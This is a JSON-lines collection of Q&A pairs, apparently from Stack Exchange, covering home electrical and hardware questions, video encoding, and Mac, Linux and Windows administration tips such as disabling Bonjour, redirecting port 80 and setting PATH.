{"title": "Should a washer go on nut side, or the bolt side?", "description": "Often I take something apart and when I go to reassemble it, I don't remember which side the washer was on.  When there's only one washer, does it generally go on the nut side (pressed up against the nut) or the bolt side (pressed up against the bolt)?\n", "answer": "Washers are used for multiple purposes when mechanical parts are assembled using bolts and nuts. Here are some usages and as you can see it is not likely that a generalized answer can be devised to directly answer your question!\n\nSome washers have a special design that attempts to help keep the nut and/or bolt from coming loose. Known as a lock washer these may be a split ring type, star type, wavy or any one of a number of other designs. A lock washer will be used with the part of the assembly that most likely could turn such as the nut. It could be used under the bolt head in instances where the bolt screws into threads in one part of the assembly.\nA washer is sometimes used to protect the surface of the assembled parts. A nut or bolt head being turned during the tightening process can mar the part surface around the hole and a washer can be used to take the abuse as opposed to the part. This may be particularly applicable when the parts are a softer material such as plastic, brass or aluminum and a washer made of a harder material is used.\nSometimes a thin material is part of the assembly and a larger diameter washer is used to help distribute the pressure of the tight bolt across a larger part of the thin material. In these cases the washer would be used against the thin material. It can help to keep the material flatter or to prevent pullout of the fastener.\nThere are times when a large diameter washer used as in #3 above may be used with yet another washer smaller in diameter washer on top of the first. This would be done for cases where the larger diameter washer may tend to mushroom when the bolt is tightened.\nAssemblies often have a slotted or oversize hole on one side. This is designed to allow for tolerance in the hole size and location in the parts being assembled. Another variation of this would be a long slotted hole that permits the adjustment of one part relative to the other before the bolt and nut are fully tightened. A washer would be used over the slotted hole to allow the pressure of the tightened bolt to be spread across the slot and up onto the part itself. In some instances the washer will also help to prevent the turning bolt head or nut from deforming the slotted part during the tightening process.\nSome assemblies are designed to have the parts move with respect to one another when the bolt is actually tight. The travel of the nut may be restricted by a shouldered design of the bolt or a sleeve can be installed around the bolt in the hole. In these cases a washer is often used to keep the moving part from wearing the bolt head or nut. The washer may be made of a material designed to reduce the friction between itself and the moving part. This can also help to keep a turning part from trying to loosen the nut through friction.\n\nMany times washers will play a role that is a combination of the above usages. One common example is to see a lock washer used along with a larger diameter flat washer. \n", "question_score": "93", "answer_score": 94}
{"title": "Is some asymmetry in a breaker box normal? What about neutral to ground having voltage?", "description": "So, next in my quest to evaluate the health of my new home's electrical system, and call in professionals if needed, was some voltage checking of the panels/outlets around the house.  What I have is a main 200A service in the basement, and a 100amp sub-panel on the main floor. See the attached schematic (notice the main panel has a bonding strap between neutral and ground, where as the sub panel does not- I believe this is the right way for it to be wired).\nI borrowed a friends Fluke multimeter and found the following- In both panels, the red bar to neutral is 119 volts, and the black bar to neutral is 121.5 volts (red and black in my diagram).  Testing the outlets around upstairs, I noticed that, as expected, some have a delta v of 119, others, 121.5.  I then tested the voltage drop across red to black, and found it to be around 242 volts. I also noticed that I have a slight voltage across my neutral to ground (it just so happens to be about 1.5 volts) upstairs.\nIs this kind of small asymmetry normal?  Should I be getting an electrician in to check things out?\n", "answer": "Neutral-ground bonding\nThe panels are wired correctly. There must only be one connection between neutral and ground in the main service panel. \nIf a subpanel has a bond, then it puts the neutral in parallel with the ground wire back to the main panel -- and this means current from normal loads (that normally the neutral would carry) will travel on ground paths back to the main panel. This includes bare ground wires, conduits, and metal housings. If someone were to touch anything grounded, they could be electrocuted. \nThis can also mean that the magnetic fields created in the hot and neutral don't cancel each other out, which can generate a lot of interference. \nIn the worst case, bad connections or other faults can cause a voltage difference between ground and neutral, causing a lot of very difficult to diagnose problems, and making it even more likely to be electrocuted by touching something grounded (anywhere in the house, from any panel). \nIn short: There must be only one bond between ground and neutral, and it goes in the main panel.\nDifferences in voltage\nThe differences in voltage between the two busses is fairly normal. It is likely caused by the transformer on the pole, or by a load in your house that is causing a voltage drop. For the latter you can try turning off circuits to see if it goes away, but for the former, you're pretty much SOL. That said, it's not a problem. Mains in North America is supposed to be 120V +/-5% (so 114 to 126V is acceptable). \nThe voltage from neutral-ground is also normal. Here is a decent (but technical) article on neutral-ground voltage. In short, it's caused by the fact that over any length of wire, you have some drop in voltage. Since no current flows in the ground wire, there is no drop there and thus you have a difference in voltage. Another source is induced current, which can be caused by wires going through magnetic fields, such as near motors. \nIn short, it doesn't sound like you have any problems.\n", "question_score": "9", "answer_score": 20}
{"title": "How to determine the correct capacity for a sub-panel for a shop?", "description": "I plan to install a sub-panel for my woodworking shop, and would like to determine the total capacity that should supply that sub-panel. These are the main items that will likely be running in the shop, possibly simultaneously:\n\ntable saw, 240v, 14 amp\ndust collector, 120v, 9 amp\nfreezer, 14 cu ft (I don't have the amperage)\n\n(The lights are run on their own circuit.)\nWhat is an appropriate capacity for the sub-panel?\n", "answer": "It's all about Volt Amperes.\nNEC 2008 gives us an easy way to do things in residential.\n\n220.82 Dwelling Unit.\n(A) Feeder and Service Load. This section applies to a dwelling unit having the total connected load served by a single 120/240-volt\nor 208Y/120-volt set of 3-wire service or feeder conductors with an\nampacity of 100 or greater. It shall be permissible to calculate the\nfeeder and service loads in accordance with this section instead of\nthe method specified in Part III of this article. The calculated load\nshall be the result of adding the loads from 220.82(B) and (C). Feeder\nand service-entrance conductors whose calculated load is determined by\nthis optional calculation shall be permitted to have the neutral load\ndetermined by 220.61.\n(B) General Loads. The general calculated load shall be not less than 100 percent of the first 10 kVA plus 40 percent of the remainder\nof the following loads:\n(1) 33 volt-amperes/m2 or 3 volt-amperes/ft2 for general lighting and\ngeneral-use receptacles. The floor area for each floor shall be\ncalculated from the outside dimensions of the dwelling unit. The\ncalculated floor area shall not include open porches, garages, or\nunused or unfinished spaces not adaptable for future use.\n(2) 1500 volt-amperes for each 2-wire, 20-ampere small appliance\nbranch circuit and each laundry branch circuit covered in 210.11(C)(1)\nand (C)(2).\n(3) The nameplate rating of the following:\na. All appliances that are fastened in place, permanently connected,\nor located to be on a specific circuit\nb. Ranges, wall-mounted ovens, counter-mounted cooking units\nc. Clothes dryers that are not connected to the laundry branch circuit\nspecified in item (2) d. Water heaters\n(4) The nameplate ampere or kVA rating of all permanently connected\nmotors not included in item (3).\n\nSo we can use 220.82 (B)(2) to figure for the dust collection, freezer, and an additional circuit for receptacles.\n1500VA * 3 = 4500VA / 120V = 37.5 Amperes\nYou'll then have to use the values from the nameplate on the table saw to figure for that (A Volt-Ampere value should be listed on the nameplate, use that number for more accurate calculations). You could also use this method for the dust collection system and freezer since they are both \"permanently connected, or located to be on a specific circuit\".\n3360VA / 240V = 14 Amperes\nNow we'll add them up.\n37.5A + 14A = 51.5A\nSo This is what our subpanel will look like.\n\n60A double pole breaker in the main panel.\n6 AWG feeder cable for a run up to 75 ft., 4 AWG feeder cable for a run up to 150 ft.\n60A main breaker in the subpanel.\n20A double pole breaker for table saw.\n20A single pole breaker for dust collector.\n20A single pole breaker for freezer.\n20A single pole breaker for convenience receptacles.\n\nNotes:\nDon't forget to balance your loads between the two legs in the subpanel.\n", "question_score": "9", "answer_score": 11}
{"title": "Why does my drill bit destroy the screw head?", "description": "I have a craftsman drill which I use for drilling. When I use a screwdriver head to fix screws in drywall or wood, it keeps on destroying the head of the screw. So much so that the screw head is unusable.\nWhat I am doing wrong? I have the drill on the slowest possible setting of 1.\nEdit: This is a battery operated drill. It looks similar to the one in the picture below.\n\n", "answer": "It is possible that there are several reasons for the screw head destruction.\n\nYou may be using an electrical tool that is not at all suitable for driving screws. Some tools designed for drilling holes are not going to offer enough torque at a low enough speed to properly drive screws. If your tool starts out with a huge burst of speed it can almost certainly lead to immediate stripping of the screw head.\nYou are using the wrong size driver bit for the type of screw that you have. If the screws are Philips head be aware that there are multiple sizes of drivers such as #1, #2 or #3.\nYou may attempting to use the wrong style of driver with the type of slot the screw. Do not mismatch the likes of Philips and Pozidrive. There may be other specialty type slots that are also similar but require the proper drive bit selection.\nIt may be that you are not properly aligned with the axis of the screw. Proper installation of screws with a driver requires that the driver be directly in line with the axis of the screw.\nWhen driving screws with a power driver is in necessary to apply a pressure on the driver to properly keep the driver bit in the screw slot. Without proper pressure the bit can run out of the slot and strip the screw head.\nIt is possible that you did not properly prepare the medium into which you are trying to drive the screws. With many screws you will need a pilot hole in the area where the threads are to engage with the medium. If you are attaching another piece to the base medium you would want to provide a screw body clearance hole to the mounted piece. This can actually result in a stronger screw joint as well.\n\n", "question_score": "9", "answer_score": 18}
{"title": "What are the differences between H.264 Profiles?", "description": "I was rendering a video in After Effects CS5 and when I was formatting it I chose the H.264 codec and in that format, it had a profile with Baseline, Main and High.\nSo I did a little test – rendering both files with Baseline and High. The only thing I noticed was that the video size was smaller, High delivering the smaller file size.\nI just wanted to know what the difference is as in which would be best for quality and best for file size.\n", "answer": "What is a profile?\nA H.264 profile more or less defines what \"bells and whistles\" the encoder can use when compressing your video – and there are lots of H.264 features that the encoder can enable. Which ones it's allowed to enable is defined by the profile. Profiles ensure compatibility between devices that have different decoding capabilities. With profiles, the encoder and decoder agree on a feature set that they can both handle.\nWhat do the different profiles do?\nFor a detailed list, see H.264 Profiles on Wikipedia.\nGenerally, the Baseline profile restricts the encoder to certain basic features only. Videos encoded with baseline profile can be easily played back, even on devices with lower computational power, such as old smartphones. Android and iOS phones, for example, used to only be able to play video encoded with the baseline profile. This has changed a little bit in the last years, where more and more phones can actually play main profile video, but not high profile.\nSo, baseline means:\n\nPrimarily for low-cost applications, this profile is most typically used in videoconferencing and mobile applications. It corresponds to the subset of features that are in common between the Baseline, Main, and High Profiles\n\nMain and High just add features to that. Especially the high profile is often used in broadcasting:\n\nThe primary profile for broadcast and disc storage applications, particularly for high-definition television applications (for example, this is the profile adopted by the Blu-ray Disc storage format and the DVB HDTV broadcast service).\n\nB slices are for example only allowed in the Main profile and above. They can be used to save on bandwidth, but are harder to decode, which is why some devices might not support them.\nWhat does that have to do with quality?\nThe profile only indirectly influences the quality. Some features of higher profiles may enable you to get the same quality with lower file sizes as compared to lower profiles.\nFor example, CABAC entropy coding (Main and High) is more efficient than CAVLC (Baseline). It is also computationally more intensive. Thus, if you give the encoder a certain bit rate to spend, it'll be able to create a better quality video with CABAC than with CAVLC because it achieves much better compression.\nThis also explains why you achieved smaller file size with the High profile — obviously, you somehow set a constant quality level and the encoder could use more advanced compression techniques to create a video file that has the same quality as the Baseline profile, but with smaller size.\nSo… which one should you use?\nSome basic rules:\n\nBaseline profile if you're targeting old mobile devices\nMain profile for modern devices and web streaming\nHigh profile for long-term storage, PCs or Macs, Blu-ray authoring, etc.\n\n", "question_score": "95", "answer_score": 127}
{"title": "Do I need to defragment Mac OS X?", "description": "Does windows need to be defragmented regularly?\nWhy does MacOS not have a Defragmentation utility? \nPlease teach a detailed person\n", "answer": "I think the best answer for this comes straight from this apple support KB\n\nAbout optimization and fragmentation\nDisk optimization is a process in\n  which the physical locations of files\n  on a volume are \"streamlined.\" Files\n  and metadata are re-arranged in order\n  to improve data access times and\n  minimize time moving a hard drive's\n  head.\nFiles can become \"fragmented\" over\n  time as they are changed and saved and\n  as the volume is filled, with\n  different parts of a single file\n  stored in different locations on a\n  volume. The process of collecting file\n  fragments and putting them \"back\n  together\" is known as optimization.\n  However, if a failure occurs during\n  optimization, such as power loss,\n  files could become damaged and need to\n  be restored from a backup copy.\nDo I need to optimize?\nYou probably won't need to optimize at\n  all if you use Mac OS X. Here's why:\n\nHard disk capacity is generally much greater now than a few years ago. With\n  more free space available, the file\n  system doesn't need to fill up every\n  \"nook and cranny.\" Mac OS Extended\n  formatting (HFS Plus) avoids reusing\n  space from deleted files as much as\n  possible, to avoid prematurely filling\n  small areas of recently-freed space.\nMac OS X 10.2 and later includes delayed allocation for Mac OS X\n  Extended-formatted volumes. This\n  allows a number of small allocations\n  to be combined into a single large\n  allocation in one area of the disk.\nFragmentation was often caused by continually appending data to existing\n  files, especially with resource forks.\n  With faster hard drives and better\n  caching, as well as the new\n  application packaging format, many\n  applications simply rewrite the entire\n  file each time. Mac OS X 10.3 Panther\n  can also automatically defragment such\n  slow-growing files. This process is\n  sometimes known as\n  \"Hot-File-Adaptive-Clustering.\"\nAggressive read-ahead and write-behind caching means that minor\n  fragmentation has less effect on\n  perceived system performance.\n\n", "question_score": "9", "answer_score": 17}
{"title": "Emulate a USB port as a USB flash drive?", "description": "Does anyone know of any software that can emulate a USB flash drive through an available USB port in OS X? Perhaps some way to map a directory to a USB port that could then be connected to another device that supports reading USB storage devices?\nI'd love to connect my laptop to my car's USB port and access files as if it were a USB drive. I know about the target disk mode with firewire (not sure if this is also supported over USB), but I was hoping for something that doesn't require booting outside of the OS (I want to retain use of the machine).\nI'm thinking there may be hardware limitations that prevent software from doing this by itself.\nAny ideas?\n", "answer": "Unfortunately, USB makes a firm distinction between the Host and the Device. If the USB receptacle on your car has the standard USB A (Host) connector like a PC would have, it means the car's computer wants to be the Host, just like your computer wants to be the Host, so they would most likely conflict with each other and not be able to talk to each other.\nSome people have made \"USB file transfer cables\" for connecting two Hosts together. These cables have an embedded chip that does the work of making the two Hosts appear as devices to each other. I believe these products assume both Hosts are full-fledged PCs, not embedded systems that happen to have a Host connector. I don't have experience with these cables, so I'm not sure whether a software install would be required on one or both ends. It might be worth looking into.\nThe USB Implementers Forum (the body behind the USB spec) eventually realized the limitations of the Host vs. Device distinction, and created the USB On-The-Go (OTG) specification as a way for USB-capable things to switch between the Host and Device roles on the fly as needed, depending on what they're talking to. However, I think you'd probably need both ends to support USB OTG.\n", "question_score": "9", "answer_score": 11}
{"title": "How do you hide a computer name on a network? (OS X 10.6)", "description": "I regularly plug my Macbook Pro into a network at work, but because of the way Mac networking works, my computer's name instantly becomes available to any other Mac on the network.  Is there a way to hide my computer's name so that I do not appear on the network list of other people's computers?  Also, can I set this up so as a network specific profile?  For instance, I would like my computer's name to show up on my home network, but not my work network.\n", "answer": "The easiest method is to make sure your computer is not broadcasting any Bonjour messages about what services are available on your computer by turning off the services.\nIn terms of the Finder, make sure File Sharing, Remote Management and Screen Sharing are all unchecked and your computer won't appear in another user's sidebar. If it has already shown up on the other user's sidebar it may not disappear right away but nothing will be accessible. This won't prevent it from appearing elsewhere (eg. if you're sharing printers then it will show up in Print dialog boxes).\nThe other alternative is to turn off Bonjour all together which requires a restart. Apple has posted instructions on how to do this. Coles notes/faster version:\nsudo /usr/libexec/PlistBuddy -c \"Add :ProgramArguments: string '-NoMulticastAdvertisements'\" /System/Library/LaunchDaemons/com.apple.mDNSResponder.plist\n\nTo turn back on:\nsudo /usr/libexec/PlistBuddy -c \"Delete :ProgramArguments:2\" /System/Library/LaunchDaemons/com.apple.mDNSResponder.plist\n\nAfter completing that run the following command as well to make it take effect:\nsudo launchctl unload /System/Library/LaunchDaemons/com.apple.mDNSResponder.plist\nsudo launchctl load /System/Library/LaunchDaemons/com.apple.mDNSResponder.plist\n\n", "question_score": "9", "answer_score": 16}
{"title": "Program for reading data off scanned graphs", "description": "I know such thing exists, because I used it somewhat long ago ... the problem being I cannot remember what it's called.\nI have some graphs from which I need to read off points (numeric values). The graphs are scanned, in one format or another, most of them being simple xy plots.\nThis program allowed to open the JPEG file, rotate it so it stands straight, click several clicks to establish the range of values (so it knows what some mouse movement stands for), and then when I click on the graph area, it would give me values of x and y variables.\nIt was incredibly useful when you have to read off some regression data shown off in way of graphs.\nI know the explanation is a bit weird, but I gather anyone who knows of it, will understand. So, any ideas?\n", "answer": "This one:\nxyExtract Graph Digitizer 2.4\n\nThe \"xyExtract\" software is used for\n  to extract data from a 2D graph\n  (orthogonal and nonorthogonal axes)\n  contained in a graphic file (scanned,\n  PDF document or in a some file like\n  GIF, JPEG, etc.).\nThe graphic file must be saved in a\n  bitmap file. Then, the \"xyExtract\"\n  converts the graph back to xy data\n  file (up to 1500 points).\nIf you want, use the \"Save Project\"\n  option on the \"File\" menu, for a\n  posterior opening of the work. After\n  each click, use the \"Adjustment\"\n  option to move the marked point (pixel\n  to pixel), if necessary.\nImportant: The xyExtract is a\n  easy-to-use software and it guides you\n  during whole the process for the\n  points recovery.\n\nOr this one:\nDigitizeIt can automatically digitize scanned graphs and output data values.\nDigitizeIt is an application that digitizes scanned graphs and charts.\nGraphs can be loaded in nearly all common image formats (incl. GIF, TIFF, JPEG, BMP, PNG, PSD, PCX, XBM, XPM, TGA, and PCT) or pasted from the clipboard. Digitizing of line and scatter plots occurs automatically, and manual digitizing via mouse clicks is also possible.\nData values are transformed to a specified axes system and can be saved in ASCII format, ready to use in many other applications e.g. Microcal Origin or Excel. Axes can be linear, logarithmic or reciprocal scale.\nMultiple different data sets can be defined and edited. It can handle tilted and distorted graphs, and includes comprehensive online help.\n\nOr this one:\nGetData Graph Digitizer lets you digitize graphs and plots\nIt is often necessary to obtain original (x,y) data from graphs, e.g. from scanned scientific plots, when data values are not available.\nGetData Graph Digitizer allows to easily get the numbers in such cases.\nWith GetData Graph Digitizer, digitizing is a four step process:\n\nOpen a graph\nSet the scale (coordinate system)\nDigitize (automatically or manually)\nCopy data to the clipboard, or export to TXT, XLS, XML, DXF or EPS file.\n\nOr this one:\nVKDigitizer\nThe program performs digitizing graphs (scanned images, etc.). For simplicity and reliability, it supports only manual point selection and rectangular coordinate system, but the image can be rotated to achieve precise alignment of axes.\nThe acquired data can be formatted according to the needs (number precision, column width, column separator, etc.).\nOr this one:\njTechDig\njTechDig is a software tool written in Java for digitizing data from an image of graph or plot. jTechDig can import images from .gif, .bmp, .png, etc. files. After mapping of the coordinates system the data can be digitized manually by clicking the mouse.\nThe graphs can be magnified and panned for higher accuracy. The captured data can be saved to text file where the data are separated by semi-colon.\nOr this one:\nUnGraph\nOften you see a graph, chart, picture or drawing and wish you could easily get hold of the X,Y data from which it was drawn. Now, you can scan such material with any scanner or photograph it with a digital camera and UnGraph will be able to give you the coordinates with a high degree of precision.\n\nOr this one:\nDidger\nDidger is a highly accurate digitizing program that will be an invaluable addition to your software library. In seconds, Didger precisely transforms points, lines, or areas from your graphics, aerial photos, paper maps, imported vector files, scanned raster images or GeoTIFF photos to a versatile digital format you can use with your other software.\nYou name it and Didger can handle it quickly, accurately, and usefully. With Didger's multitude of features and ease-of-use, this is an unbelievable value, considering the time and effort you will save!! You will soon wonder how you have done your job without this indispensable tool.\n\n", "question_score": "9", "answer_score": 11}
{"title": "Setting up wifi router as a switch for Internet Connection Sharing", "description": "Can my laptop with a 3G connection share its Internet via a Wifi router (Dlink DIR-615)?\nIf so, what should I set on my laptop, on my router or on the devices connecting to the router?\n", "answer": "How to configure a Wi-Fi router to share your computer's 3G data stick connection to everyone.\n\nConnect to the Internet on your 3G data stick.\nPlug your laptop to one of the router's LAN ports.  Wait until the router connects correctly.\nClick Start > Control Panel > View Network status and tasks > Change adapter settings\nRight click the modem (or the connection where you get Internet from) > Status > Details. Write down the  \"IPv4 DNS Servers\" on a piece of paper. Click Close once. \nRight click the Local Area Network > Status > Details.  Write down the \"IPv4 Default Gateway\". Click Close >  Close.\nOpen the browser and type the IPv4 Default Gateway on the addressbar.  Routers are all different so you need to figure out where to find and configure the following:\n\nReview your wireless security settings. What is your SSID? What is your security key? Write this down.\nUnder WAN, choose \"Static IP\" instead of \"PPPoE\" or \"Automatic - DHCP\".\nUnder WAN, set the WAN IP to 192.168.137.2\nUnder WAN, set the Netmask to 255.255.255.0\nUnder WAN, set the Gateway to 192.168.137.1\nUnder WAN, set the DNS Server(s) to the \"IPv4 DNS Servers\" you got from step 4.\nClick Save.\n\nUnplug your laptop from the router's LAN port and plug it to the WAN port. Wait until the router connects correctly.\nGo back to the \"Network connection\" screen on Step 4 > Properties > Sharing >\n\nCheck \"Allow other network users to connect through this computer's Internet connection.\"\nUnder Home networking connection choose \"Local Area Connection\" \nClick OK then OK.\n\nRight click the Local Area Network > Status > Details.  Is the IPv4 address \"192.168.137.1\"? If yes, then you're done! Tell everyone to connect to the wireless router and they will be online. \n\nNOTE: There's a router-less method using \"ad-hoc networks\", but using a\n  router provides more range and can\n  handle more connected computers or\n  wifi phones.\n\nTo put things back to before.\n\nUncheck the \"Allow other network users to connect through this computer's Internet connection.\" on Step 7. Click OK.\nUnplug the laptop from the router's WAN port and plug it into one of its LAN ports.\nOpen a browser and visit the \"IPv4 Default Gateway\" address you got from Step 5. \nSwitch the WAN setting from \"Fixed IP\" back to \"Automatic - DHCP\". Save changes.\nYou're done!\n\nOnly one more thing: Sometimes, after the configuration, it is necessary to restart your modem, computer and router. In one situation, I connected them in this way. Modem → My Computer → Router → all other devices (like laptop, network printer, other computer).\n", "question_score": "9", "answer_score": 13}
{"title": "Storing hard drive near electric wire", "description": "Can storing a hard drive near an electric wire (220V) damage the hard drive?\nI have no clue about such things so I thought I'd ask here. It's just that I found a suitable storage place for one of my external drives, but there's electric wire nearby.\n", "answer": "Generally speaking, the EMF produced by electrical cabling will not be sufficient to damage or cause data corruption on a hard drive. Electrical cabling can cause interference with network cables, if they run parallel for a long distance; over a long distance the interference adds up, and signals on a network cable are quite weak and thus relatively easily corrupted.\nHowever, in a hard drive, there are several factors acting to reduce the impact of power cable EMF:\n\nTraces on a hard drive are very short, and thus don't pick up much energy from the power cables.\nThe hard drive's platter and magnetic read heads are encased in shielding typically made of iron or some other ferromagnetic metal; this shields it from external magnetic fields.\nAlthough a SATA or USB cable is similar in some ways to a network cable, the relatively short run length reduces the chance that power cable interference will be significant, and error-correction codes will repair any corruption that does occur.\n\nIn short, don't worry about it, unless you're working with some kind of industrial equipment with VERY high currents on that cable (the amount of interference emitted from a power cable is proportional to the current on it). Household currents are unlikely to be a problem.\n", "question_score": "9", "answer_score": 16}
{"title": "Why is sudo required to start up a webserver on a given ip:port?", "description": "I'm setting up a Python-based webserver on my Debian box.\nSetup:\n\nThe Debian OS is VM based, but I've switched the VirtualBox from NAT to Bridged.\nIP of the VM setup = 192.168.1.7 (per my router's admin screen or ifconfig).\nI've succesfully set up my router's port forwarding for both ssh and HTTP.\nI've successfully set up my router's dynamic dns using dyndns.com.\n\nRegardless of the specific Python webserver I'm using (Django, CherryPy, standard library), I have to start the webserver @ 192.168.1.7:80 using sudo. Otherwise I get an error about not having permission to access the port. None of the webserver tutorials mention needing to use sudo when specifying an ip:port.\nQuestion: why do I need to use sudo to start these webservers? Is it an indication that I shouldn't be using 192.168.1.7? Or that I'm not setting a config file properly somewhere?\n", "answer": "It is standard behavior that non-privileged users are not allowed to bind to privileged ports (port numbers below 1024). Therefore an application which would like to bind to port 80 for example will have to run privileged (usually this means to run as root) in order to bind to this port.\nA common approach is to run a small \"listener\" process with privileged user which accepts the connection and then spawns a non-privileged process to handle the request. Dropping privileges for request processing is done for security reason. If somebody is able to exploit the process which handles the request, then usually it allows an intruder to execute commands using the same privileges as the processing process. Therefore it would be bad to handle the whole request using a privileged process.\nHowever for many applications it's common nowadays to run as non-root; but such processes of course cannot bind to privileged ports then in standard configuration. So servers like Tomcat or JBoss used to bind to high-ports like 8080 instead so they don't need a privileged listener.\nOf course if you expose such a process to the internet you would likely provide access on port 80 as each browser would first try to connect to port 80 when HTTP protocol is used.\nW common work-around to provide this is to use a firewall or port-translator in between the application and the public internet. So requests hit the firewall requesting port 80 but the firewall forwards the request to some internal host on port 8080. This way the real web-server can operate on high-ports while being publicly available on port 80.\n- (internet request) ----> (port 80)[Firewall] ------> (port 8080)[Webserver]\n\nSometimes this redirect is simply done using iptables NAT rule:\niptables -A PREROUTING -t nat -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080\n\nThis allows running an unprivileged application listening on port 8080 while all incoming requests for port 80 are just redirected to port 8080.\nHowever using modern Linux kernels there is another possibility: Use capabilities.\nsetcap CAP_NET_BIND_SERVICE=+ep /some/webserver/binary\n\nThis would allow binary to bind to privileged ports even when started as from non-root user. See man capabilities for more details.\n", "question_score": "9", "answer_score": 14}
{"title": "Which emacs shortcuts are useful in bash?", "description": "Other than Ctrl+{k, u, a, e}, what other emacs shortcuts are worth remembering and useful in the Terminal?\n", "answer": "It would be difficult to say which shortcuts are worth remembering for you, it is entirely dependent on your workflow.  Here is a selection you can go through to decide for yourself:\nCtrl-a   Move to the start of the line.\nCtrl-e   Move to the end of the line.\nCtrl-b   Move back one character.\nAlt-b    Move back one word.\nCtrl-f   Move forward one character.\nAlt-f    Move forward one word.\nCtrl-] x Where x is any character, moves the cursor forward to the next occurrence of x.\nAlt-Ctrl-] x Where x is any character, moves the cursor backwards to the previous occurrence of x.\nCtrl-u   Delete from the cursor to the beginning of the line.\nCtrl-k   Delete from the cursor to the end of the line.\nCtrl-w   Delete from the cursor to the start of the word.\nEsc-Del  Delete previous word (may not work, instead try Esc followed by Backspace)\nCtrl-y   Pastes text from the buffer (similar to clipboard).\nCtrl-l   Clear the screen leaving the current line at the top of the screen.\nCtrl-x Ctrl-u Undo the last changes. Ctrl-_ does the same\nAlt-r    Undo all changes to the line.\nAlt-Ctrl-e Expand command line.\nCtrl-r   Incremental reverse search of history.\nAlt-p    Non-incremental reverse search of history.\n!!       Execute last command in history\n!abc     Execute last command in history beginning with abc\n!abc:p   Print last command in history beginning with abc\n!n       Execute nth command in history\n!$       Last argument of last command\n!^       First argument of last command\n^abc^xyz Replace first occurrence of abc with xyz in last command and execute it\n\n", "question_score": "9", "answer_score": 13}
{"title": "Resources To Use FFMPEG Effectively", "description": "Lately i've posted a lot of questions about how to use ffmpeg.  It's pretty clear to me that I am missing some sort background in video encoding and was wondering if any of my fellow superusers had any good resources for studying up on video encoding.  What do I need to understand before I can use ffmpeg effectively?\n", "answer": "Video formats and general guidelines\nFirst of all, you need to understand which different codecs and formats exist, and what they are typically used for:\nWhat is a Codec (e.g. DivX?), and how does it differ from a File Format (e.g. MPG)?\nYou should also look into what makes up video quality in a more general fashion, e.g. how does bit rate, frame rate, or picture size affect the quality?\nWhat do the numbers 240 and 360 mean when downloading video? How can I tell which video is more compressed?\nLet's use FFmpeg…\nYou should know how to install the latest version of FFmpeg. The latest versions always include up-to-date bugfixes and new functions. People often make the mistake to use the old versions bundled with their distributions or that they have on some server – these often just do not work.\n\nLinux: There are static builds from Burek and from Relaxed. Download, extract, use it. You can also install FFmpeg from the Git sources. There are extensive tutorials for Ubuntu and CentOS available.\nWindows has static builds online.\nOS X offers a formula for Homebrew installed with brew install ffmpeg after installing Homebrew itself.\n\nRead the FFmpeg documentation, at least the general options, and learn the basic command line switches.\nAlso check out our Super User blog entry: FFmpeg: The ultimate Video and Audio Manipulation Tool for an always up-to-date guide on transcoding with FFmpeg and a few examples as well as a large link collection at the end.\nEncoding with x264\nThe best free video encoder out there today is x264, and using libx264, FFmpeg can use it too. You should install x264 and read the help with x264 --fullhelp. x264 has plenty of options, which are mapped to FFmpeg.\nFor encoding, you will then be able to use the presets x264 offers. They are accessible through the FFmpeg options too. There are some main options which come in handy. Read the x264 encoding guide on the FFmpeg wiki. In short, this is what you can use:\n\n-profile:v specifies the h.264 profile to be used, for example high, which could be used for all kinds of video playing software, or baseline, which restricts the video to use features that work on a mobile phone or iPod only.\n-preset specifies the encoding presets for speed. fast will give you faster results, but worse compression, for example. These range from veryslow to ultrafast. Default is medium.\n-tune offers options for tweaking the output based on the input files, e.g. animated movies with animation or normal movies with film.\n-crf sets the Constant Rate Factor, the #1 method to be used when trying to tweak the result quality. Read up on it here. Use a value between 18 and 27, where lower means better quality. Default is 23.\n\nYou can install a video encoder like Handbrake and see which options it uses. Learn by doing, and try to read up on what all the parameters do.\n\n", "question_score": "9", "answer_score": 14}
{"title": "Why am I able to execute a program that is not in my PATH environment variable?", "description": "I was wondering why the command java -version is globally accessible?\nI could run it from any directory and its working:\n\nHow does it work?\nThis is what my system PATH variable looks like:\nC:\\Program Files (x86)\\NVIDIA Corporation\\PhysX\\Common;\n%SystemRoot%\\system32;\n%SystemRoot%;\n%SystemRoot%\\System32\\Wbem;\n%SYSTEMROOT%\\System32\\WindowsPowerShell\\v1.0\\\n\nAs for me, java.exe is located in %programfiles%\\java\\jre7\\bin\n", "answer": "Typically, there is a group of directories where executable files that are repeatedly used are to be found by your Windows, but in pratice there is no specific reason to use a command as global or not. Developers used to include it as \"global\" wherever they want to, they are free to do it. If you want to use any command as \"global\" you will need to add your command as a \"Windows Enviroment Variable\". To do this, you can use the folowing methods:\n\nAdding manually with \"Windows System properties\": \n\nUsing the add-on tool Setx.exe:\n\nIt is not part of the standard Windows XP setup but a command-line tool called setx.exe is included in the Windows XP Service Pack 2 Support Tools. This tool extends the set command so that permanent changes in the environment variables can be made. For example, to add a folder C:\\New Folder to the path, the command would be \nsetx path \"%PATH%;C:\\New Folder\" \n\nScripts for Listing Environment Variables:\n\nThe \"Set\" command can be used in a command prompt together with a redirection to a text file to make a list of the current environment variables. The command might be \nset > C:\\env_list.txt \n\nThe file name \"C:\\env_list.txt\" can be replaced by any of your choice.\nMicrosoft also has a VBScript that lists environment variables on this page. \n\nRegistry Keys for Environment Variables:\n\nFor those who are experienced with editing the Registry, there is another way to make changes in environment variables. User environment variables are stored in the Registry in the key:\nHKEY_CURRENT_USER\\Environment\n\nSystem variables are found in the key:\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\n\nNote that any environment variable that is in the form that needs to be expanded (for example, %PATH%) must be stored in the registry as a REG_EXPAND_SZ registry value. Editing the Registry is primarily for scripts used by systems administrators and is not recommended for the average PC user. \nYou can find more information about it here.\n", "question_score": "9", "answer_score": 13}
